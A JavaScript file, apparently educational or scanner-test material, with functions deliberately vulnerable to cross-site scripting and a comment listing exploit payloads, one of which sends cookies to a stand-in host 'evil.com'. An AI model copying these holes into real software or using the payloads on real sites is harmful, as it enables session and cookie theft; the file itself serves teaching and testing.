/**
 * Example: Cross-Site Scripting (XSS) Vulnerabilities
 * This code demonstrates various XSS vulnerabilities in JavaScript
 */

// VULNERABLE: Direct innerHTML assignment with user input
function displayUsername(username) {
    const userDiv = document.getElementById('user-display');
    // VULNERABLE: User input directly inserted into DOM
    userDiv.innerHTML = 'Welcome, ' + username + '!';
}

// VULNERABLE: document.write with user data
function showMessage(message) {
    // VULNERABLE: Can inject malicious scripts
    document.write('<div>' + message + '</div>');
}

// VULNERABLE: eval() with user-controllable input
function executeUserCode(userCode) {
    // VULNERABLE: Extremely dangerous - executes arbitrary code
    eval(userCode);
}

// VULNERABLE: setTimeout/setInterval with string argument
function scheduleAction(action) {
    // VULNERABLE: String is evaluated as code
    setTimeout(action, 1000);
}

// VULNERABLE: Location manipulation without sanitization
function redirectUser(targetUrl) {
    // VULNERABLE: Can redirect to javascript: URLs
    window.location = targetUrl;
}

// VULNERABLE: jQuery html() without sanitization
function updateContent(htmlContent) {
    // VULNERABLE: Inserts HTML without escaping
    $('#content').html(htmlContent);
}

// VULNERABLE: Creating script tags dynamically
function loadUserScript(scriptUrl) {
    const script = document.createElement('script');
    // VULNERABLE: Loading script from user-controlled URL
    script.src = scriptUrl;
    document.body.appendChild(script);
}

// VULNERABLE: Reflected XSS in URL parameters
function displaySearchResults() {
    const urlParams = new URLSearchParams(window.location.search);
    const searchQuery = urlParams.get('q');
    const resultDiv = document.getElementById('search-results');

    // VULNERABLE: Query parameter directly in innerHTML
    resultDiv.innerHTML = '<h2>Results for: ' + searchQuery + '</h2>';
}

// VULNERABLE: DOM-based XSS via hash
function processHash() {
    const hash = window.location.hash.substring(1);
    // VULNERABLE: Hash value used in innerHTML
    document.getElementById('output').innerHTML = decodeURIComponent(hash);
}

// VULNERABLE: Inline event handler with user data
function createButton(label, onClick) {
    const button = document.createElement('button');
    // VULNERABLE: User data in event handler
    button.setAttribute('onclick', onClick);
    button.textContent = label;
    document.body.appendChild(button);
}

/**
 * Example exploitation scenarios:
 *
 * 1. Stored XSS:
 *    username = "<img src=x onerror=alert('XSS')>"
 *    When displayUsername() is called, executes JavaScript
 *
 * 2. Reflected XSS:
 *    URL: ?q=<script>alert(document.cookie)</script>
 *    displaySearchResults() will execute the script
 *
 * 3. DOM-based XSS:
 *    URL: #<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>
 *    processHash() will leak cookies
 *
 * 4. JavaScript injection:
 *    userCode = "alert(document.cookie)"
 *    executeUserCode() will steal cookies
 */

console.warn('WARNING: This code contains intentional XSS vulnerabilities!');
console.warn('For educational purposes only!');
